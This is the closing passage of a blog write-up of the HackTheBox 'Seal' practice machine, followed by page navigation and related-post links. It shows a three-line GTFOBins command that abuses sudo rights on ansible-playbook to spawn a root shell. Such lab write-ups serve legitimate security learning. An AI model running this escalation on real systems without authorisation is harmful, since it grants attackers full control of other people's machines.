<code class="language-plaintext highlighter-rouge">seal</code></p><p><img data-proofer-ignore data-src="/image/hackthebox/seal/19.png" alt="19" /></p><h2 id="gtfobins-poc">GTFObins POC</h2><p>I can run <code class="language-plaintext highlighter-rouge">ansible-playbook</code> binary as <code class="language-plaintext highlighter-rouge">root</code> user, I quickly jumped to <a href="https://gtfobins.github.io/gtfobins/ansible-playbook/#sudo">GTFObins</a> which showed following commands to get as <code class="language-plaintext highlighter-rouge">root</code>. I created <code class="language-plaintext highlighter-rouge">root.sh</code> file and transfered that file over to target machine.</p><div class="language-bash highlighter-rouge"><div class="code-header"> <span text-data=" Shell "><i class="fa-fw fas fa-code small"></i></span> <button aria-label="copy" title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
</pre><td class="rouge-code"><pre><span class="nv">TF</span><span class="o">=</span><span class="si">$(</span><span class="nb">mktemp</span><span class="si">)</span>
<span class="nb">echo</span> <span class="s1">'[{hosts: localhost, tasks: [shell: /bin/sh &lt;/dev/tty &gt;/dev/tty 2&gt;/dev/tty]}]'</span> <span class="o">&gt;</span><span class="nv">$TF</span>
<span class="nb">sudo </span>ansible-playbook <span class="nv">$TF</span>
</pre></table></code></div></div><p>After running file <code class="language-plaintext highlighter-rouge">bash root.sh</code> I was escalated to <code class="language-plaintext highlighter-rouge">root</code> user.</p><p><img data-proofer-ignore data-src="/image/hackthebox/seal/18.png" alt="18" /></p></div><div class="post-tail-wrapper text-muted"><div class="post-meta mb-3"> <i class="far fa-folder-open fa-fw mr-1"></i> <a href='/categories/ctf/'>CTF</a>, <a href='/categories/hackthebox/'>hackthebox</a></div><div class="post-tags"> <i class="fa fa-tags fa-fw mr-1"></i> <a href="/tags/htb/" class="post-tag no-text-decoration" >htb</a> <a href="/tags/hackthebox/" class="post-tag no-text-decoration" >hackthebox</a> <a href="/tags/ctf/" class="post-tag no-text-decoration" >ctf</a> <a href="/tags/nmap/" class="post-tag no-text-decoration" >nmap</a> <a href="/tags/https/" class="post-tag no-text-decoration" >https</a> <a href="/tags/443/" class="post-tag no-text-decoration" >443</a> <a href="/tags/sudo/" class="post-tag no-text-decoration" >sudo</a> <a href="/tags/tomcat/" class="post-tag no-text-decoration" >tomcat</a> <a href="/tags/blackhat/" class="post-tag no-text-decoration" >blackhat</a> <a href="/tags/orangetsai/" class="post-tag no-text-decoration" >orangetsai</a> <a href="/tags/parser/" class="post-tag no-text-decoration" >parser</a> <a href="/tags/nginx/" class="post-tag no-text-decoration" >nginx</a> <a href="/tags/gitbucket/" class="post-tag no-text-decoration" >gitbucket</a> <a href="/tags/ansible/" class="post-tag no-text-decoration" >ansible</a> <a href="/tags/ansibleplaybook/" class="post-tag no-text-decoration" >ansibleplaybook</a> <a href="/tags/playbook/" class="post-tag no-text-decoration" >playbook</a> <a href="/tags/war/" class="post-tag no-text-decoration" >war</a> <a href="/tags/msfvenom/" class="post-tag no-text-decoration" >msfvenom</a> <a href="/tags/synchronize/" class="post-tag no-text-decoration" >synchronize</a> <a href="/tags/gtfobins/" class="post-tag no-text-decoration" >gtfobins</a> <a href="/tags/gtfo/" class="post-tag no-text-decoration" >gtfo</a> <a href="/tags/sudo/" class="post-tag no-text-decoration" >sudo</a></div><div class="post-tail-bottom d-flex justify-content-between align-items-center mt-3 pt-5 pb-2"><div class="license-wrapper"> This post is licensed under <a href="https://creativecommons.org/licenses/by/4.0/"> CC BY 4.0 </a> by the author.</div><div class="share-wrapper"> <span class="share-label text-muted mr-1">Share</span> <span class="share-icons"> <a href="https://twitter.com/intent/tweet?text=HackTheBox Seal - amroot&url=https://am-root.github.io/posts/HTB-Seal/" data-toggle="tooltip" data-placement="top" title="Twitter" target="_blank" rel="noopener" aria-label="Twitter"> <i class="fa-fw fab fa-twitter"></i> </a> <a href="https://www.facebook.com/sharer/sharer.php?title=HackTheBox Seal - amroot&u=https://am-root.github.io/posts/HTB-Seal/" data-toggle="tooltip" data-placement="top" title="Facebook" target="_blank" rel="noopener" aria-label="Facebook"> <i class="fa-fw fab fa-facebook-square"></i> </a> <a href="https://www.linkedin.com/sharing/share-offsite/?url=https://am-root.github.io/posts/HTB-Seal/" data-toggle="tooltip" data-placement="top" title="Linkedin" target="_blank" rel="noopener" aria-label="Linkedin"> <i class="fa-fw fab fa-linkedin"></i> </a> <i id="copy-link" class="fa-fw fas fa-link small" data-toggle="tooltip" data-placement="top" title="Copy link" title-succeed="Link copied successfully!"> </i> </span></div></div></div></div></div><div id="panel-wrapper" class="col-xl-3 pl-2 text-muted topbar-down"><div class="access"><div id="access-lastmod" class="post"> <span>Recent Update</span><ul class="post-content pl-0 pb-1 ml-1 mt-2"><li><a href="/posts/HTB-Nunchucks/">HackTheBox Nunchucks</a></ul></div><div id="access-tags"> <span>Trending Tags</span><div class="d-flex flex-wrap mt-3 mb-1 mr-3"> <a class="post-tag" href="/tags/hackthebox/">hackthebox</a> <a class="post-tag" href="/tags/htb/">htb</a> <a class="post-tag" href="/tags/nmap/">nmap</a> <a class="post-tag" href="/tags/ctf/">ctf</a> <a class="post-tag" href="/tags/sudo/">sudo</a> <a class="post-tag" href="/tags/443/">443</a> <a class="post-tag" href="/tags/apache/">apache</a> <a class="post-tag" href="/tags/blackhat/">blackhat</a> <a class="post-tag" href="/tags/bypass/">bypass</a> <a class="post-tag" href="/tags/capability/">capability</a></div></div></div><script src="https://cdn.jsdelivr.net/gh/afeld/bootstrap-toc@1.0.1/dist/bootstrap-toc.min.js"></script><div id="toc-wrapper" class="pl-0 pr-4 mb-5"> <span class="pl-3 pt-2 mb-2">Contents</span><nav id="toc" data-toggle="toc"></nav></div></div></div><div class="row"><div class="col-12 col-lg-11 col-xl-8"><div id="post-extend-wrapper" class="pl-1 pr-1 pl-sm-2 pr-sm-2 pl-md-4 pr-md-4"><div id="related-posts" class="mt-5 mb-2 mb-sm-4"><h3 class="pt-2 mt-1 mb-4 ml-1" data-toc-skip>Further Reading</h3><div class="card-deck mb-4"><div class="card"> <a href="/posts/HTB-Nunchucks/"><div class="card-body"> <span class="timeago small" >Nov 9, 2021<i class="unloaded">2021-11-09T00:00:00+00:00</i> </span><h3 class="pt-0 mt-1 mb-3" data-toc-skip>HackTheBox Nunchucks</h3><div class="text-muted small"><p> Nunchucks is an Easy level box that is using ExpreessJS application template engine, Nunjucks, and later finding out its subdomain. On that subdomain Server Side Template Injection(SSTI) vulnerabil...</p></div></div></a></div><div class="card"> <a href="/posts/HTB-Pikaboo/"><div class="card-body"> <span class="timeago small" >Dec 14, 2021<i class="unloaded">2021-12-14T00:00:00+00:00</i> </span><h3 class="pt-0 mt-1 mb-3" data-toc-skip>HackTheBox Pikaboo</h3><div class="text-muted small"><p> Machine Information Pikaboo is extremely fun box to solve. The box starts with enumeration on web server that is hosting nginx but later finding that Apache is running as well. Apache server can b...</p></div></div></a></div><div class="card"> <a href="/posts/HTB-Monitors/"><div class="card-body"> <span class="timeago small" >Oct 31, 2021<i class="unloaded">2021-10-31T00:00:00+00:00</i> </span><h3 class="pt-0 mt-1 mb-3" data-toc-skip>HackTheBox Monitors</h3><div class="text-muted small"><p> Machine Information Monitors is a hard difficulty machine that starts with a vulnerable RFI plugin on a WordPress site. I acquire information on different vHosts hosting vulnerable cactus after som...</p></div></div></a></div></div></div><div class="post-navigation d-flex justify-content-between"> <a href="/posts/HTB-Nunchucks/" class="btn btn-outline-primary" prompt="Older"><p>HackTheBox Nunchucks</p></a> <a href="/posts/HTB-Pikaboo/" class="btn btn-outline-primary" prompt="Newer"><p>HackTheBox Pikaboo</p></a></div></div></div></div><footer class="d-flex w-100 justify-content-center"><div class="d-flex justify-content-between align-items-center"><div class="footer-left"><p class="mb-0"> © 2022 <a href="https://twitter.com/_amroot">Janak Khairmode</a>. <span data-toggle="tooltip" data-placement="top" title="Except where otherwise noted, the blog posts on this site are licensed under the Creative Commons Attribution 4.0 International (CC BY 4.0) License by the author.">Some rights reserved.</span></p></div><div class="footer-right"><p class="mb-0"> Powered by <a href="https://jekyllrb.com" target="_blank" rel="noopener">Jekyll</a> with <a href="https://github.com/cotes2020/jekyll-theme-chirpy" target="_blank" rel="noopener">Chirpy</a> theme.</p></div></div></footer></div><div id="search-result-wrapper" class="d-flex justify-content-center unloaded"><div class="col-12 col-sm-11 post-content"><div id="search-hints"><h4 class="text-muted mb-4">Trending Tags</h4><a class="post-tag" href="/tags/hackthebox/">hackthebox</a> <a class="post-tag" href="/tags/htb/">htb</a> <a class="post-tag" href="/tags/nmap/">nmap</a> <a class="post-tag" href="/tags/ctf/">ctf</a> <a class="post-tag" href="/tags/sudo/">sudo</a> <a class="post-tag" href="/tags/443/">443</a> <a class="post-tag" href="/tags/apache/">apache</a> <a class="post-tag" href="/tags/blackhat/">blackhat</a> <a class="post-tag" href="/tags/bypass/">bypass</a> <a class="post-tag" href="/tags/capability/">capability</a></div><div id="search-results" class="d-flex flex-wrap justify-content-center text-muted mt-3"></div></div></div></div><div id="mask"></div><a id="back-to-top" href="#" aria-label="back-to-top" class="btn btn-lg btn-box-shadow" role="button"> <i class="fas fa-angle-up"></i> </a> <script src="https://cdn.jsdelivr.net/npm/simple-jekyll-search@1.10.0/dest/simple-jekyll-search.min.js"></script> <script> SimpleJekyllSearch({ searchInput: document.getElementById('search-input'), resultsContainer: document.getElementById('search-results'), json: '/assets/js/data/search.json', searchResultTemplate: '<div class="pl-1 pr-1 pl-sm-2 pr-sm-2 pl-lg-4 pr-lg-4 pl-xl-0 pr-xl-0"> <a href="{url}">{title}</a><div class="post-meta d-flex flex-column flex-sm-row text-muted mt-1 mb-1"> {categories} {tags}</div><p>{snippet}</p></div>', noResultsText: '<p class="mt-5">Oops! No result founds.</p>', templateMiddleware: function(prop, value, template) { if (prop === 'categories') { if (value === '') { return `${value}`; } else { return `<div class="mr-sm-4"><i class="far fa-folder fa-fw"></i>${value}</div>`; } } if (prop === 'tags') { if (value === '') { return `${value}`; } else { return `<div><i class="fa fa-tag fa-fw"></i>${value}</div>`; } } } }); </script> <script src="https://cdn.jsdelivr.net/combine/npm/lozad/dist/lozad.min.js,npm/magnific-popup@1/dist/jquery.magnific-popup.min.js,npm/clipboard@2/dist/clipboard.min.js"></script> <script defer src="/assets/js/dist/post.min.js"></script> <script src="https://cdn.jsdelivr.net/combine/npm/popper.js@1.16.1,npm/bootstrap@4/dist/js/bootstrap.min.js"></script> <script defer src="/app.js"></script> <script defer src="https://www.googletagmanager.com/gtag/js?id="></script> <script> document.addEventListener("DOMContentLoaded", function(event) { window.dataLayer = window.dataLayer || []; function gtag(){dataLayer.push(arguments);} gtag('js', new Date()); gtag('config', ''); }); </script>
